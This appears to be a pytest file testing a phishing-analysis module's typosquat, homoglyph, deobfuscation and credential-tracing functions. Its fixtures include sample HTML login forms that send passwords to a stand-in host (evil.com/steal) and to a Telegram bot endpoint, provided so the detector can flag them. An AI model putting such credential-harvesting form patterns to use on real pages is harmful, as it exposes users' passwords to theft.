"""Tests for sh_engine.py analysis functions."""

import pytest

from sh_engine import (
    detect_typosquat,
    deobfuscate,
    trace_credentials,
)


def test_detect_typosquat_brand():
    """Test typosquatting detection with legitimate brand."""
    result = detect_typosquat("google.com")
    assert result["available"] is True
    assert result["is_brand"] is True
    assert len(result["matches"]) == 0


def test_detect_typosquat_similar():
    """Test typosquatting detection with similar domain."""
    result = detect_typosquat("gogle.com")
    assert result["available"] is True
    assert result["is_brand"] is False
    assert len(result["matches"]) > 0


def test_detect_typosquat_homoglyph():
    """Test homoglyph detection."""
    result = detect_typosquat("gооgle.com")  # Cyrillic 'o'
    assert result["available"] is True
    assert len(result["flags"]) > 0


def test_deobfuscate_no_html():
    """Test deobfuscation with no HTML."""
    result = deobfuscate("")
    assert result["available"] is False
    assert result["layers"] == []


def test_deobfuscate_base64():
    """Test base64 deobfuscation."""
    html = 'atob("aGVsbG8=")'
    result = deobfuscate(html)
    # May or may not find it depending on implementation
    assert "layers" in result


def test_trace_credentials_no_html():
    """Test credential detection with no HTML."""
    result = trace_credentials("", "https://example.com")
    assert result["available"] is False
    assert result["forms"] == []


def test_trace_credentials_simple_form():
    """Test credential form detection."""
    html = """
    <form action="https://login.example.com">
        <input type="text" name="username">
        <input type="password" name="password">
        <button>Login</button>
    </form>
    """
    result = trace_credentials(html, "https://example.com")
    assert result["available"] is True
    assert len(result["forms"]) > 0


def test_trace_credentials_offsite():
    """Test detection of off-site credential sending."""
    html = """
    <form action="https://evil.com/steal">
        <input type="password" name="pass">
    </form>
    """
    result = trace_credentials(html, "https://legitimate.com")
    assert result["available"] is True
    assert result["risk"] > 0  # Should flag off-site credential sending


def test_trace_credentials_telegram():
    """Test detection of credential sending to Telegram."""
    html = """
    <form action="https://t.me/capture_bot">
        <input type="password" name="password">
    </form>
    """
    result = trace_credentials(html, "https://example.com")
    assert result["available"] is True
    assert result["risk"] > 0  # Should flag Telegram endpoint
